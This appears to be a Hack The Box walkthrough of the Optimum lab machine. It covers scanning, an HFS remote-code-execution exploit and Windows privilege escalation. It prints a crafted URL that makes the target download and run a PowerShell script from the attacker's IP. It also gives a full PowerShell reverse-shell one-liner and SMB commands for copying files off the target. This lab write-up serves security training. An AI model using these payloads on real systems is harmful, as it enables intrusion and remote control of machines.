# Box 



![](img/Pasted%20image%2020210820060554.png)

https://app.hackthebox.eu/machines/Optimum

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)
* [Extra](#Extra)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.8 10.10.10.8
```


![](img/Pasted%20image%2020210820054321.png)

Going on the website, we see nothing interesting but using searchsploit we found a RCE exploit.

## Exploitation

![](img/Pasted%20image%2020210820054534.png)

I used this one `windows/remote/39161.py` , let's see how it works. 

![](img/Pasted%20image%2020210820054635.png)

![](img/Pasted%20image%2020210820054654.png)

So we have to setup a python server with `nc.exe` inside and to change port & ip adress for the reverse_shell.

![](img/Pasted%20image%2020210820054746.png)

I use a function to setup my python server but it is the same as usual.

![](img/Pasted%20image%2020210820054834.png)

Let's use the exploit now.

![](img/Pasted%20image%2020210820054931.png)


So we have a shell

![](img/Pasted%20image%2020210820054915.png)

## Post-Exploitation
### User

We already are user, but for some reasons powershell didn't work. 

I modified the payload manually and used a powershell reverse shell.

url to hit : 

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.14.13/rev.ps1%27).}
```

my reverse_shell : 

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![](img/Pasted%20image%2020210820055201.png)

Now that's better.

### Root

To be able to copy file in my local directory, I setup a smbserver.

```
sudo smbserver.py share . -smb2support
```

![](img/Pasted%20image%2020210820055339.png)


Now let's mount it on the remote machine.

```
net use x: \\10.10.14.13\share
```

![](img/Pasted%20image%2020210820055531.png)

![](img/Pasted%20image%2020210820055456.png)

We are going to use `windows-exploit-suggester.py` to get a list of possible exploits. For this we need to extract the system information of the machine.

```
systeminfo > x:/systeminfo.txt
```

```
┌──(kali㉿kali)-[~/Hacking/tmp/smb]                                                                                                                                                                                                     
└─$ cat systeminfo.txt                                                                                                                
Host Name:                 OPTIMUM                                                                                                                                                                                                           
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                                                                                                         
OS Version:                6.3.9600 N/A Build 9600                                                                                                                                                                                           
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                                             
OS Configuration:          Standalone Server                                                                                                                                                                                                 
OS Build Type:             Multiprocessor Free                                                                                                                                                                                               
Registered Owner:          Windows User                                                                                                                                                                                                      
Registered Organization:                                                                                                                                                                                                                     
Product ID:                00252-70000-00000-AA535                                                                                                                                                                                           
Original Install Date:     18/3/2017, 1:51:36                                                                                                                                                                                                
System Boot Time:          26/8/2021, 9:49:25                                                                                                                                                                                                
System Manufacturer:       VMware, Inc.                                                                                                                                                                                                      
System Model:              VMware Virtual Platform                                                                                                                                                                                           
System Type:               x64-based PC                                                                                                                                                                                                      
Processor(s):              1 Processor(s) Installed.                                                                                                                                                                                         
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                                                                                                                                                   
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                                                                                         
Windows Directory:         C:\Windows                                                                                                                                                                                                        
System Directory:          C:\Windows\system32                                                                                                                                                                                               
Boot Device:               \Device\HarddiskVolume1                                                                                                                                                                                           
System Locale:             el;Greek
....
```

Let's run `windows-exploit-suggester.py`

```
./windows-exploit-suggester.py -i smb/systeminfo.txt -d ../tools/windows/2021-08-20-mssb.xls
```

There are a lot of results, but trying one by one it works : 
![](img/Pasted%20image%2020210820060056.png)

Getting it on my machine then copying it on my smbserver.

![](img/Pasted%20image%2020210820060226.png)

Rooted.

## Extra

Checking other people writeup, it seems there are other exploit working. (https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)

MS16032 would have worked.

